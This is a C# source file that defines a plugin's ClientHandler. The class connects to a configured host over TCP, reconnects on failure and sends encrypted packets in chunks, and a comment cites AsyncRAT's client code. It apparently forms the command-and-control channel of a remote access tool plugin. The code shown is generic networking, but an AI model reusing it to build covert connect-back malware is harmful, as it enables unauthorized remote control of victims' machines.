﻿using PacketLib;
using PacketLib.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class ClientHandler : IDisposable
    {
        public Host host { get; set; }
        private Socket socket { get; set; }
        public bool Connected { get; set; }
        public string HWID { get; set; }
        public string baseIp { get; set; }
        public string key { get; set; }
        public bool closeClient { get; set; }


        public delegate bool ConnectAsync();
        private delegate int SendDataAsync(IPacket data);


        public ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;


        public ClientHandler(Host host, string key) : base()
        {
            this.host = host;
            this.key = key;
            sendDataAsync = new SendDataAsync(SendData);
        }


        public void ConnectStart()
        {
            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(host.host, host.port);
                return true;
            }
            catch { }
            return false;
        }
        public void EndConnect(IAsyncResult ar)
        {
            Connected = connectAsync.EndInvoke(ar);
            if (!Connected)
            {
                ConnectStart();
            }
        }


        public void SendPacket(IPacket packet)
        {
            if (Connected)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }

        /*
            https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Client/Connection/ClientSocket.cs
            Lines 228 - 243
            
                    if (buffer.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        using (MemoryStream memoryStream = new MemoryStream(buffer))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                                SslClient.Flush();
                                lock (Settings.LockReceivedSendValue)
                                    Settings.SentValue += read;
                            }
                        }
                    }
         */
        private int SendData(IPacket data)
        {
            try
            {
                byte[] encryptedData = data.SerializePacket(this.key);
                lock (socket)
                {
                    int total = 0;
                    int size = encryptedData.Length;
                    int datalft = size;
                    byte[] header = new byte[5];
                    socket.Poll(-1, SelectMode.SelectWrite);

                    byte[] temp = BitConverter.GetBytes(size);

                    header[0] = temp[0];
                    header[1] = temp[1];
                    header[2] = temp[2];
                    header[3] = temp[3];
                    header[4] = (byte)data.packetType;

                    int sent = socket.Send(header);

                    if (size > 1000000) 
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData)) 
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    return size;
                }
            }
            catch (Exception ex)
            {
                Connected = false;
                return 0;
            }
        }

        private void SendDataCompleted(IAsyncResult ar)
        {
            int size = sendDataAsync.EndInvoke(ar);
            if (Connected)
            {      

            }
            this.Dispose();
        }

        public void Dispose()
        {
            socket.Close();
            socket.Dispose();
            socket = null;
        }
    }
}
